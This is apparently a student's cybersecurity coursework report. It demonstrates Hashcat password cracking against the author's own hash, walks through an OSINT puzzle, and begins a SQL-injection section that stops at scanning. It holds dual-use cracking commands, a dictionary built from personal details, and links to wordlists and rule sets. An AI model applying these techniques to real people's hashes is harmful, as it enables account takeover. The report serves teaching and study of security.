@@ -1,1 +1,699 @@
-tis just a test
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>cs263 cw</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__left">
+    <div class="stackedit__toc">
+      
+<ul>
+<li><a href="#cs263---cybersecurity-coursework">CS263 - Cybersecurity Coursework</a>
+<ul>
+<li></li>
+</ul>
+</li>
+<li><a href="#table-of-contents">Table of contents</a></li>
+<li><a href="#part-1-cybersecurity-tool-presentation-hashcat">Part 1: Cybersecurity Tool Presentation, Hashcat</a>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#what-is-hashcat">What is hashcat</a></li>
+<li><a href="#the-hashcat-utils-library">The hashcat-utils library</a></li>
+<li><a href="#why-hashcat">Why Hashcat?</a></li>
+<li><a href="#benchmark">Benchmark</a></li>
+<li><a href="#practical-example">Practical Example</a></li>
+<li><a href="#community-modularity--synergy">Community, Modularity & Synergy</a></li>
+</ul>
+</li>
+<li><a href="#part-2-osint-research">Part 2: OSINT Research</a>
+<ul>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#data-explanation--sources">Data, Explanation & Sources</a></li>
+<li><a href="#challenges">Challenges</a></li>
+</ul>
+</li>
+<li><a href="#part-3-sql-injection-exploit-and-malware">Part 3: SQL Injection exploit and Malware</a>
+<ul>
+<li><a href="#scanning">Scanning</a></li>
+<li><a href="#detecting-and-exploiting-vulnerability">Detecting and Exploiting Vulnerability</a></li>
+<li><a href="#accessing">Accessing</a></li>
+<li><a href="#malware-infection">Malware Infection</a></li>
+<li><a href="#consequences">Consequences</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="stackedit__right">
+    <div class="stackedit__html">
+      <h1 id="cs263---cybersecurity-coursework">CS263 - Cybersecurity Coursework</h1>
+<blockquote>
+<p><em>Harmony Bouabid, 2213811</em><br>
+For the best view of this report, please use the web markdown version:.<br>
+The link is not indexed by any search engine.*</p>
+</blockquote>
+<h3 id="harm.root.sx">&gt;&gt;&gt; <a href="http://harm.root.sx/">harm.root.sx</a></h3>
+<h1 id="table-of-contents">Table of contents</h1>
+<ul>
+<li>
+<p><strong>Part 1</strong>: Cybersecurity Tool Presentation, Hashcat</p>
+<ul>
+<li>Introduction</li>
+<li>What is Hashcat</li>
+<li>The hashcat-utils library</li>
+<li>Why Hashcat?</li>
+<li>Benchmark</li>
+<li>Practical Example</li>
+<li>Community, Modularity &amp; Synergy</li>
+</ul>
+</li>
+<li>
+<p><strong>Part 2</strong>: OSINT Research</p>
+<ul>
+<li>Methodology</li>
+<li>Data, Explanation &amp; Sources</li>
+<li>Challenges</li>
+</ul>
+</li>
+<li>
+<p><strong>Part 3</strong>: SQL Injection, Exploitation and Malware Infestation</p>
+<ul>
+<li>Scanning</li>
+<li>Detecting and Exploiting Vulnerability</li>
+<li>Accessing</li>
+<li>Malware Infection</li>
+<li>Consequences</li>
+</ul>
+</li>
+</ul>
+<h1 id="part-1-cybersecurity-tool-presentation-hashcat">Part 1: Cybersecurity Tool Presentation, Hashcat</h1>
+<ul>
+<li>
+<h2 id="introduction">Introduction</h2>
+</li>
+</ul>
+<p>Gaining access to the <code>/etc/shadow</code> file is a critical target in attacks on cybersecurity systems. This file, crucial in Unix/Linux systems, contains the hashed and salted passwords of users. Should an attacker succeed in obtaining it, the security of all the accounts on the system becomes compromised. The robustness of the encryption algorithms used is often the system’s last- and usually most important - layer of security. From database leaks to network packet interception, an attacker will eventually depend on the manipulation and analysis of cryptographic algorithms.</p>
+<p>In a white-box cryptographic environment, which assumes that the victim has unlimited access to an implementation of an unbreakable and faultless cryptographic function, nothing short of attack optimization can make a difference, given that they are often impervious to brute-force attacks. A wide range of tools are available for this purpose, of which Hashcat stands out for its power, flexibility and ability to make full use of hardware to shorten the deciphering process.</p>
+<ul>
+<li>
+<h2 id="what-is-hashcat">What is hashcat</h2>
+</li>
+</ul>
+<p>Hashcat is a password decryption tool that stands out for its ability to process a wide range of standard algorithms <em>(MD5, SHA-1, bcrypt…)</em>, common algorithms used in database processing <em>(PBKDF2, Scrypt, PostgreSQL…)</em> or proprietary systems <em>(7-Zip, Oracle H: Type, BitLocker…)</em>. It is open-source and available on Windows, Linux and MacOS. Unlike most other tools, Hashcat is designed to use the full processing power of processors (CPUs) and graphics processing units (GPUs), offering much greater performance for versatile attack vectors:</p>
+<ul>
+<li>
+<h3 id="dictionary-attacks">Dictionary attacks</h3>
+</li>
+</ul>
+<p>Dictionary attacks use a predefined list of potential passwords, called a ‘wordlist’, to test them against a hash. These attacks are effective against weak passwords, often found in public databases or based. One of the most commonly used dictionaries is <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou.txt</a>. Lists of larger and smaller dictionaries based on the most common passwords observed in data leaks are available online, for example <a href="https://github.com/kkrypt0nn/wordlists">here</a><br>
+Rules (pre-defined transformation that mimic common human behaviour and patterns applied to each entry) can also be appended to this attack. One common example is the substituton of the character “i” with “1”. A library of rules can be found <a href="https://github.com/n0kovo/hashcat-rules-collection">here</a>.</p>
+<ul>
+<li>
+<h3 id="combinator-attacks">Combinator attacks</h3>
+</li>
+</ul>
+<p>Combinatorial attacks concatenate keywords from multiple dictionaries to create a new larger set, which itself is used for a dictionary attack.</p>
+<ul>
+<li>
+<h3 id="brute-force-and-mask-attacks">Brute-force and Mask attacks</h3>
+</li>
+</ul>
+<p>Brute-force attacks systematically test for all possible combinations of characters until the correct password is found. Mask attacks are a variation of brute-force where we can incorporate known patterns to reduce the search space. In other words, we can specify the charset of every character individually.<br>
+There are multiple pre-defined charsets in Hashcat the user can choose from. Those charsets are:</p>
+
+<table>
+<thead>
+<tr>
+<th>?</th>
+<th>Charset</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>l</td>
+<td>abcdefghijklmnopqrstuvwxyz [a-z]</td>
+<td>Lower case letters</td>
+</tr>
+<tr>
+<td>u</td>
+<td>ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]</td>
+<td>Upper case letters</td>
+</tr>
+<tr>
+<td>d</td>
+<td>0123456789                 [0-9]</td>
+<td>Digits</td>
+</tr>
+<tr>
+<td>h</td>
+<td>0123456789abcdef           [0-9a-f]</td>
+<td>Lower case hexadecimal charset</td>
+</tr>
+<tr>
+<td>H</td>
+<td>0123456789ABCDEF           [0-9A-F]</td>
+<td>Upper case hexadecimal charset</td>
+</tr>
+<tr>
+<td>s</td>
+<td>!"#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~</td>
+<td>Common ASCII/Console printable symbols</td>
+</tr>
+<tr>
+<td>a</td>
+<td>?l?u?d?s</td>
+<td>Lower case + Upper Case + Digits + Symbols</td>
+</tr>
+<tr>
+<td>b</td>
+<td>0x00 - 0xff</td>
+<td>All possible bytes</td>
+</tr>
+</tbody>
+</table><ul>
+<li>
+<h3 id="hybrid-attacks">Hybrid attacks</h3>
+</li>
+</ul>
+<p>Hybrid attacks combine dictionary attacks with brute force techniques. A common example is to add a special character to the end of each dictionary entry.</p>
+<ul>
+<li>
+<h2 id="the-hashcat-utils-library">The hashcat-utils library</h2>
+</li>
+</ul>
+<p>On top of Hashcat, this tool comes with a set of stand-alone binaries that are designed to execute a specific function that can aid us in formatting, moving, merging or ordering large dictionaries.</p>
+<ul>
+<li>
+<h2 id="why-hashcat">Why Hashcat?</h2>
+</li>
+</ul>
+<p>As said in the introduction, there are several white-box cryptography attacking tools. One of the most famous is JohnTheRipper, which we have seen multiple times in lectures. Hashcat, however, remains the prime choice as:</p>
+<ul>
+<li>
+<p>It is able to leverage the full performance of available hardware. Unlike JohnTheRipper, and most other tools, Hashcat is not limited to CPU operations. It can harness the power of the GPU <em>(mostly through CUDA for Nvidia, HIP for AMD or OpenCL)</em>, or even an array of GPUs, which are much more efficient at hashing operations than CPUs. (See Benchmarks)</p>
+</li>
+<li>
+<p>It supports a very wide range of algorithms, protocols and their variations (salted or not). In total, Hashcat has by default, in version 6.2.5, <strong>400 different pre-built modes.</strong><br>
+List of a few of Hashcat’s Available Modes <em>(v6.2.5)</em></p>
+
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Name</th>
+<th>Category</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>900</td>
+<td>MD4</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>0</td>
+<td>MD5</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>100</td>
+<td>SHA1</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>1300</td>
+<td>SHA2-224</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>1400</td>
+<td>SHA2-256</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>10800</td>
+<td>SHA2-384</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>1700</td>
+<td>SHA2-512</td>
+<td>RawHash</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+</tr>
+</tbody>
+</table></li>
+<li>
+<p>It features an important attack flexibility. The numbers of attack vectors and methods combined with the ability to create a union of different modes of attacks, rules and masks ensures that an attacker has the ability to choose the settings that make a successful attack as likely as possible.</p>
+</li>
+<li>
+<h2 id="benchmark">Benchmark</h2>
+</li>
+</ul>
+<p>A few benchmarking tests have been conducted on this hardware:</p>
+<blockquote>
+<p><em>Core™ i7-8750H (2.2 GHz, 4.1GHz Turbo)</em><br>
+<em>Nvidia GTX 1070 mobile (8 GB GDDR5)</em></p>
+</blockquote>
+<h3 id="john-benchmarking-cpu--based">John Benchmarking (CPU  based)</h3>
+<p>Using JoshTheRipper, the CPU is called on all 12 CPU threads (2 threads per core). These are some of the benchmark results:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> john --test
+Will run 12 OpenMP threads
+Benchmarking: descrypt, traditional crypt<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token punctuation">[</span>DES 128/128 SSE2-16<span class="token punctuation">]</span>
+Many salts:     18566K c/s real, 2462K c/s virtual
+
+Benchmarking: md5crypt <span class="token punctuation">[</span>MD5 32/64 X2<span class="token punctuation">]</span>
+Raw:    55854 c/s real, 7478 c/s virtual
+
+Benchmarking: bcrypt <span class="token punctuation">(</span><span class="token string">"<span class="token variable">$2a</span><span class="token variable">$05</span>"</span>, 32 iterations<span class="token punctuation">)</span> <span class="token punctuation">[</span>Blowfish 32/64 X2<span class="token punctuation">]</span>
+Raw:    2745 c/s real, 410 c/s virtual
+
+Benchmarking: LM <span class="token punctuation">[</span>DES 128/128 SSE2-16<span class="token punctuation">]</span>
+Raw:    72443K c/s real, 9587K c/s virtual
+
+Benchmarking: AFS, Kerberos AFS <span class="token punctuation">[</span>DES 48/64 4K<span class="token punctuation">]</span>
+Short:  541593 c/s real, 535171 c/s virtual
+</code></pre>
+<h3 id="hashcat-benchmarking-gpu--based">Hashcat Benchmarking (GPU  based)</h3>
+<p>With Hashcat,  we run benchmarks on the same algorithms, but this time on the GPU:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> hashcat --benchmark
+hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting <span class="token keyword">in</span> benchmark mode
+
+OpenCL API <span class="token punctuation">(</span>OpenCL 3.0 CUDA 12.7.33<span class="token punctuation">)</span> - Platform <span class="token comment">#1 [NVIDIA Corporation]</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+* Device <span class="token comment">#1: NVIDIA GeForce GTX 1070, 8064/8191 MB (2047 MB allocatable), 16MCU</span>
+
+---------------------
+* Hash-Mode 3000 <span class="token punctuation">(</span>LM<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........: 15744.1 MH/s</span>
+
+--------------------------------------------------------
+* Hash-Mode 1500 <span class="token punctuation">(</span>descrypt<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........:   655.4 MH/s</span>
+
+------------------------------------------------------------------------------
+* Hash-Mode 500 <span class="token punctuation">(</span>md5crypt<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........:  6096.3 kH/s</span>
+
+----------------------------------------------------------------
+* Hash-Mode 3200 <span class="token punctuation">(</span>bcryp<span class="token punctuation">]</span>
+Speed.<span class="token comment">#1.........:    15656 H/s</span>
+
+--------------------------------------------------------
+* Hash-Mode 7500 <span class="token punctuation">(</span>Kerberos<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........:   269.8 MH/s</span>
+</code></pre>
+<h3 id="benchmarking-results">Benchmarking Results</h3>
+
+<table>
+<thead>
+<tr>
+<th>Algorithm</th>
+<th>John (CPU, in h/s)</th>
+<th>Hashcat (GPU, in h/s)</th>
+<th>Difference x</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>descrypt</td>
+<td>18566 K</td>
+<td>655.4 M</td>
+<td>3530%</td>
+</tr>
+<tr>
+<td>md5crypt</td>
+<td>55854</td>
+<td>6096.3 K</td>
+<td>10915%</td>
+</tr>
+<tr>
+<td>bcrypt</td>
+<td>2745</td>
+<td>15656 H</td>
+<td>570%</td>
+</tr>
+<tr>
+<td>LM</td>
+<td>72443 K</td>
+<td>15744.1 M</td>
+<td>21733%</td>
+</tr>
+<tr>
+<td>Kerberos AFS</td>
+<td>541593</td>
+<td>269.8 M</td>
+<td>49816%</td>
+</tr>
+</tbody>
+</table><p><strong>Difference on local benchmarks</strong>: Hashcat is 17312% faster than John on average</p>
+<ul>
+<li>
+<h2 id="practical-example">Practical Example</h2>
+</li>
+</ul>
+<p>Let’s generate a sha256 password, based on some of my personal information, that an average user would consider “Very Secure”. We can imagine a scenario in which an attacker have found this password in a leaked database and wants to decipher it to gain access to my accounts.</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">echo</span> -n <span class="token string">"Harmony2004@"</span> <span class="token operator">|</span> sha256sum <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span> <span class="token operator">&gt;</span> password.hash 
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">cat</span> password.hash 
+660654bb0a874984f164117c9de0875a480d5c354444b1bb04a80e483e039ce0
+</code></pre>
+<p>The password contains capital and lower case letters, numbers and at least a symbol. Most website’s password verification would also agree that this is a valid secure password. However, from our perspective, it is simply a combination of some trivially easy to find information combined with rules.<br>
+To attack this hash, assuming we do not know the original password, we will in this demonstration start by generating a (very) small dictionary with some of my public personal information that could be gathered by an OSINT research. My name, year of birth, country of origin, country code, favourite game and University:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">cat</span> harmony.dict 
+harmony
+2004
+morocco
+MA
+ULTRAKILL
+warwick
+</code></pre>
+<p>From this dictionary, we will generate a new dictionary using two sets of rules:<br>
+<a href="https://raw.githubusercontent.com/n0kovo/hashcat-rules-collection/refs/heads/main/MISC/best64.rule">best64.rule</a> and <a href="https://raw.githubusercontent.com/n0kovo/hashcat-rules-collection/refs/heads/main/t0xic/T0XlC-insert_space_and_special_0_F.rule">special.rule</a>:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> hashcat --stdout -a 0 -r best64.rule -r special.rule harmony.dict <span class="token operator">&gt;</span> harmony_rule.dict
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">head</span> harmony_rule.dict 
+ harmony
+ ynomrah
+ harmony5
+<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+</code></pre>
+<p>And we will use this dictionary in combine mode with itself. For this purpose, we will only use it twice; however if the attack fails, we can always try more intensive parameters (more rules, bigger input dictionary, larger combine…).</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> hashcat -a 1 -m 1400 password.hash harmony_rule.dict harmony_rule.dict
+<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+660654bb0a874984f164117c9de0875a480d5c354444b1bb04a80e483e039ce0:Harmony2004@
+                                                          
+Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
+Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
+Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 1400 <span class="token punctuation">(</span>SHA2-256<span class="token punctuation">)</span>
+Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 660654bb0a874984f164117c9de0875a480d5c354444b1bb04a<span class="token punctuation">..</span>.039ce0
+<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+</code></pre>
+<p>And magic! We have succesfully cracked the hash.</p>
+<ul>
+<li>
+<h2 id="community-modularity--synergy">Community, Modularity &amp; Synergy</h2>
+</li>
+</ul>
+<p>Hashcat is fully open-source and modular, altough it requires a lot of technical knowledge to implement effeciently a new module. As such, any user with enough experience can create their own modules for properitery cryptographic functions.</p>
+<p>Hashcat is typically rarely a tool used on its own, or on your own. There is only so much a single individual can achieve on a single machine, no matter how powerful it is; and there are virtually no end-goal to attacking any cryptographic function if they are not retrieved from a center of interest.</p>
+<p>It is, however, a tool that fills the gap between an attack and a dire attack.</p>
+<p><a href="https://hashcat.net/hashcat/">Hashcat</a>, Main Webpage of Hashcat.<br>
+<a href="https://github.com/digininja/pipal">Pipal</a> , Password Analyser<br>
+<a href="https://hashes.com/en/decrypt/hash">Hashes.com</a>, Rainbow Tables<br>
+<a href="https://hashmob.net/leaderboard">hashmob.net</a>,  Community Submitted Rainbow Tables<br>
+<a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a>, RSA Attacks<br>
+<a href="https://factordb.com/">factordb</a>, Integer Factorization Database<br>
+<a href="https://crackstation.net/">crackstation</a> Rainbow Tables</p>
+<h1 id="part-2-osint-research">Part 2: OSINT Research</h1>
+<h2 id="methodology">Methodology</h2>
+<p>In order to conduct the OSINT analysis of the <code>deity.abc</code> file, a systematic methodology will be followed to ensure clarity, traceability and integrity of the results. The process of <strong>planning and direction</strong> can be skipped, as the table of questions in the coursework’s pdf can be used to outline the requirements of the investigation and steps of the research. The next phase is the <strong>collection phase</strong>, during which tools such as <code>file</code>, <code>binwalk</code> and <code>xxd</code> will be used to assess the file type and extract any embedded metadata or information. In the event that the file is encrypted or uses a proprietary format, we will attempt to identify its structure and decode it with suitable tools. During the <strong>processing and exploitation</strong> phase, the raw data will be prepared by cleaning it up, removing irrelevant information and using steganography tools such as <code>zsteg</code> and <code>stegsolve</code> to examine embedded images or files. The information gathered will then be cross-referenced with public data sources, such as archives or geolocation databases, during the <strong>analysis and production</strong> phase, in order to discover links and validate the results. Reporting will be detailed and traceable during the <strong>dissemination and integration</strong> phase, ensuring that the integrity of the evidence collected is preserved for admissibility in a legal or investigative context. Along the way - through the use of tools such as Tor or VPNs - care will be taken to avoid leaving a digital trail.</p>
+<h2 id="data-explanation--sources">Data, Explanation &amp; Sources</h2>
+
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Answer</th>
+<th>Explanation</th>
+<th>Sources</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>What is the content of the file deity.abc?</em></td>
+<td><strong><code>Locked.rar, Images.rar, Riddles.pdf</code></strong></td>
+<td>By running <code>&gt;&gt;&gt; file deity.abc</code>, we get <code>deity.abc: RAR archive data, v5</code>. We understand that we have to change the .abc extension to .rar</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td><em>What is the 3-digit number of the last vehicle of the 35th potus?</em></td>
+<td><strong><code>300</code></strong></td>
+<td>The 50th President of the United-States is no other than John F Kennedy, famous for being assassinated while in a car. We can assume that his “last car” would be that limousine. After a quick google search, we find an article that shows the plate number (and the absurd amount of money it was sold for).</td>
+<td><a href="https://www.bbc.co.uk/news/world-us-canada-34759098">JFK licence plates sell for $100,000 at auction - bbc.co.uk</a></td>
+</tr>
+<tr>
+<td><em>In which year did G.O. warn us about the threat of totalitarianism?</em></td>
+<td><strong><code>1984</code></strong></td>
+<td>G.O in this context is the initials of George Orwell, author of the famous book “1984”, which tells the story of a dystopic totalitharian world. Technically speaking, 1984 was published in 1949, but we get the subtility.</td>
+<td><a href="https://en.wikipedia.org/wiki/Nineteen_Eighty-Four">Nineteen Eighty-Four - Wikipedia</a></td>
+</tr>
+<tr>
+<td><em>What picture should we analyse?</em></td>
+<td><strong><code>2184.png</code></strong></td>
+<td>The file “Riddles.pdf”, present in deity.rar (originally deity.abc), gave us the solution by asking “Find the 3-digit plate number […] Add to it the year G.O. warned us […] Now you know which picture to analyse”. Not very original to pick the only .png file in-between .jpg files, but it works. Also ensures the previous two answers were correct, as we get an exact result.</td>
+<td><a href="https://www.wolframalpha.com/input?i=300%2b1984=2284">Verification</a></td>
+</tr>
+<tr>
+<td><em>How can you fix the picture?</em></td>
+<td><strong><code>Remove null-bytes until adress 00004190</code></strong></td>
+<td>The picture was corrupted. I am still not sure if this was an issue with my system or if this was a challenge. <br> <code>&gt;&gt;&gt; eog 2284.png</code> returns an error, <br><code>&gt;&gt;&gt; file 2284.png</code> ⇒  <code>2284.png: data</code>,<br><code>&gt;&gt;&gt; pngcheck 2284.png</code> ⇒ <code>2284.png this is neither a PNG or JNG image nor a MNG stream ERROR: 2284.png</code>. <br>We finally try:<br><code>&gt;&gt;&gt; exiftool 2284.png</code> ⇒ <code>[...] Error: First 16 KiB of file is binary zeros</code>.<br>And here it is. We check:<br><code>&gt;&gt;&gt; xxd 2284.png | head</code> ⇒ <code>0000000: 0000 0000 0000 000 [...]</code><br>We remove all the 16KiB null-bytes, then get a valid png file.</td>
+<td><a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html">PNG Structure</a></td>
+</tr>
+<tr>
+<td><em>What is the number derived from The Picture?</em></td>
+<td>** <code>987</code>**</td>
+<td>We are asked to “divide-and-conquer it”. We will thus gather data from the two main elements we can see, and then combine them together. On the foreground, we can see Fibonacci. The name Fibonacci is known for being an asteroid discovered in 1982, called “6765 Fibonacci” (and also for the Fibonacci sequence). In the top-left corner, we can see what appears to be a simplified plan of a fighter jet. We crop the image to keep the focus on the jet, and do a reverse image search. We find that the jet in question is an F16<sub>c</sub> Fighting Falcon. We know that the Fibonacci sequence is commonly represented by the letter f, that we are looking for a number, so it is safe to assume that the number we are looking for is f<sub>16</sub> = 987 (where f<sub>16</sub> is the 16th number of the Fibonacci sequence)</td>
+<td><a href="https://aerofred.com/details.php?image_id=87407">F16 Plan</a>,<br> <a href="https://r-knott.surrey.ac.uk/fibonacci/fibtable.html">Values of Fibonacci</a>, <br><a href="https://www.thoughtco.com/leonardo-pisano-fibonacci-biography-2312397">Portrait of Fibonacci</a> <em>(unknown 19th-century artist)</em></td>
+</tr>
+<tr>
+<td><em>What is the key?</em></td>
+<td><strong><code>01123581321345589144233377610987</code></strong></td>
+<td>We are asked in <code>Riddles.pdf</code> to “Start from 0 and concatenate the results to find the key”. Naturally, we simply concatenate the values of the Fibonacci sequence from f<sub>0</sub> to f<sub>16</sub> included, and use the key to decipher and open Locked.rar</td>
+<td><a href="https://r-knott.surrey.ac.uk/fibonacci/fibtable.html">Values of Fibonacci</a></td>
+</tr>
+<tr>
+<td><em>Locate the city where The Building stands</em></td>
+<td><strong><code>New York</code></strong></td>
+<td>We simply do a reverse image search with the <code>The Building.jfif</code> file. We instantly find the website where the picture was taken from, and the City</td>
+<td><a href="https://www.freementalhealth.us/services/new-york_kirby-forensic-psychiatric-center">freementalhealth.us</a></td>
+</tr>
+<tr>
+<td><em>What is the name of The Building?</em></td>
+<td><strong><code>Kirby Forensic Psychiatric Center</code></strong></td>
+<td>Same source as above gives us the building too.</td>
+<td><a href="https://www.freementalhealth.us/services/new-york_kirby-forensic-psychiatric-center">freementalhealth.us</a></td>
+</tr>
+<tr>
+<td><em>Locate The City</em></td>
+<td><strong><code>Galveston, TX</code></strong></td>
+<td>Basically an open-book round of Geoguessr. We gather all crucial data we can see: <br>- Warm region (Palm Trees)<br>- Driving on the right<br>- Location is probably in the USA (Sign with Bank of America in the background, car and plate format)<br>- 61st Street (USA confirmed from the street naming format)<br>- Probably Gulf of Mexico (Florida/Texas/Louisiana)<br>- Looked up on Google Maps “JSC 61st st” and got it. <br><br> ⇒ 2823 61st St, Galveston, TX 77551, United-States (March 2021)</td>
+<td><a href="https://www.google.com/maps/@29.269048,-94.8277304,3a,75y,298.72h,82.25t/data=!3m8!1e1!3m6!1ssvr2Ufmm1xcyZi79EawFPQ!2e0!5s20210301T000000!6shttps://streetviewpixels-pa.googleapis.com/v1/thumbnail?cb_client=maps_sv.tactile&amp;w=900&amp;h=600&amp;pitch=7.752623357682751&amp;panoid=svr2Ufmm1xcyZi79EawFPQ&amp;yaw=298.7207883139694!7i16384!8i8192?coh=205410&amp;entry=ttu&amp;g_ep=EgoyMDI0MTAyOS4wIKXMDSoASAFQAw==">Google Street View</a></td>
+</tr>
+<tr>
+<td><em>What is the exact year a hurricane hit This City in the last two centuries?</em></td>
+<td><strong><code>1900</code></strong></td>
+<td>We look up “Galveston Hurricane” and somehow decide to pick the one that happened in the year 1900. There were <strong>56 registered hurricanes</strong> in the last 150 years.</td>
+<td><a href="https://hurricanecity.com/city/galveston.htm">Galveston,Texas history with tropical systems</a></td>
+</tr>
+<tr>
+<td><em>What is the name of the former board player?</em></td>
+<td><strong><code>Wilhelm Steinitz</code></strong></td>
+<td>We search “Manhattan Psychiatric Center famous patients”, and find <code>Wilhelm Steinitz</code>, a chess player (which can be called board) who died in the Manhattan Psychiatric Center in the year 1900. Thus somehow relating to our previous hints</td>
+<td><a href="https://en.wikipedia.org/wiki/Manhattan_Psychiatric_Center">Manhattan Psychiatric Center - Wikipedia</a></td>
+</tr>
+<tr>
+<td><em>Can you name the object you are looking for?</em></td>
+<td><strong><code>Chess pawn</code></strong></td>
+<td>Based on the original zip’s file name “deity”, and through reading the biography of Wilhelm Steinitz, we can find sources relating to him stealing or giving a pawd to a deity “God”. Most notably a quote by <a href="https://en.wikipedia.org/wiki/Adolf_Anderssen">Adolf Anderssen</a> “Steinitz is a pick-pocket, he steals a pawn and wins a game with it.” or In  <em>Grandmasters of Chess</em>  (e.g. page 113 of the 1973 edition) Harold C. Schonberg affirmed: “He also tried to get in touch with God; he wanted to challenge the Deity to a match, offering Him odds of pawn and move”.</td>
+<td><a href="https://en.wikipedia.org/wiki/Wilhelm_Steinitz">Wilhelm Steinitz</a>, <br><a href="https://timesmachine.nytimes.com/timesmachine/1887/01/23/104007957.pdf">Schonberg’s quote</a>, <br><a href="https://www.chesshistory.com/winter/extra/steinitzgod.html">Steinitz versus God: Edward Winter</a></td>
+</tr>
+</tbody>
+</table><h2 id="challenges">Challenges</h2>
+<p>The OSINT riddles on their own were not hard as none of them required particular technical knowledge. However, the main hurdle I encountered was because some questions were either very confusing or straight up missleading. One of which was related to the fact that George Orwell’s book was published in 1949, whereas the expected answer was 1984. Nonetheless, thus far the answers we had could be verified. The limited number of files meant that if we had an exact match (if there exist a picture named “300 + our date”), there was a very high chance that our date was correct. The Fibonacci sequence part took me an embarassing amount of time, so I retraced all my steps up until that point to figure out what had to be done.</p>
+<p>However, two questions felt extremely frustrating for multiple reasons:</p>
+<ul>
+<li>The year a hurricane hit Galveston in the past 150 years</li>
+<li>The board player</li>
+</ul>
+<p>The former felt like guessing without any particular hints. There has been over 50 hurricanes in that city in the past 150 years, and there have been no indication as to what factor should decide which to chose (intensity, damage, duration, most recent one, oldest one…). The coursework’s pdf asked for a hurricane in the last two centuries, whereas Riddles.pdf asked for one in the last 150 years. The discrepency only made things more confusing.</p>
+<p>The latter was extremely hard to find without the year, and the fact that the picture <code>The Building.jfif</code> showed the “Kirby Forensic Psychiatric Center”, when the person we were looking for was in the “Manhattan Psychiatric Center” which are two <strong>distinct</strong> buildings. I simply guessed the coursework was wrong, went in the wrong direction I assumed the author went and put all the pieces of the puzzle back together.</p>
+<h1 id="part-3-sql-injection-exploit-and-malware">Part 3: SQL Injection exploit and Malware</h1>
+<h2 id="scanning">Scanning</h2>
+<p>We open the web server (I’m forwarding port 10001 to 80). We see a very minimal login page. We notice that the URL gets redirected to <code>/login.php</code> upon login.</p>
+<p>We do a quick default check and OS recognition with nmap</p>
